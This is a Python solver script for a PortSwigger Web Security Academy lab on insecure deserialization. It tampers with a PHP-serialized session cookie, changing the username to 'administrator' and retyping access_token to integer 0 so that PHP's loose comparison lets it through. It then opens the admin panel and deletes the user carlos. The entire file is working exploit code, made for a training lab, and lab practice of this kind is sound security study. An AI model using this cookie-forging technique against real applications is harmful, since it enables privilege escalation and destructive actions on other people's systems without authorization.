#!/usr/bin/env python3
"""
Modifying serialized data types
PortSwigger Web Security Academy -- Insecure Deserialization

Companion script for the writeup: 02-modifying-serialized-data-types.md

What this does:
    Logs in as wiener, decodes the PHP-serialized session cookie, changes
    "username" to "administrator" and retypes "access_token" from a string
    to the bare integer 0. PHP's loose == comparison treats 0 as equal to
    any non-numeric string, so the (now-integer) token satisfies the
    application's access check -- granting access to /admin, from which we
    delete carlos.

Usage:
    python 02-modifying-serialized-data-types.py <lab-url>
    e.g. python 02-modifying-serialized-data-types.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import base64
import re
import sys
import urllib.parse

import httpx


def _login(client: httpx.Client, base_url: str, username: str, password: str) -> str:
    login_page = client.get(f"{base_url}/login")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text)
    csrf = csrf_match.group(1) if csrf_match else None
    login_data = {"username": username, "password": password}
    if csrf:
        login_data["csrf"] = csrf
    client.post(f"{base_url}/login", data=login_data)
    return client.cookies.get("session")


def _decode_cookie(value: str) -> str:
    decoded = urllib.parse.unquote(value)
    return base64.b64decode(decoded).decode("utf-8", errors="replace")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url, "wiener", "peter")
    if not session:
        print("[-] Login failed")
        return

    decoded = _decode_cookie(session)
    print(f"[*] Decoded session cookie: {decoded}")

    # username -> "administrator" (length prefix must grow to 13)
    modified = re.sub(
        r's:\d+:"username";s:\d+:"[^"]+";',
        's:8:"username";s:13:"administrator";',
        decoded,
    )
    # access_token -> bare integer 0 (type tag flips s -> i, no quotes/length)
    modified = re.sub(
        r's:\d+:"access_token";s:\d+:"[^"]+";',
        's:12:"access_token";i:0;',
        modified,
    )
    print(f"[*] Modified cookie: {modified}")

    tampered_cookie = base64.b64encode(modified.encode()).decode()
    client.cookies.set("session", tampered_cookie)

    admin_r = client.get(f"{lab_url}/admin")
    print(f"[*] GET /admin -> {admin_r.status_code}")

    delete_match = re.search(r'href="(/admin/delete\?username=carlos)"', admin_r.text)
    if not delete_match:
        print("[-] No delete link for carlos found on /admin -- type juggling may have failed.")
        return

    del_r = client.get(f"{lab_url}{delete_match.group(1)}")
    print(f"[*] Delete carlos -> {del_r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via the type-juggled access_token.")
    else:
        print("[-] Not solved yet -- inspect the /admin response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
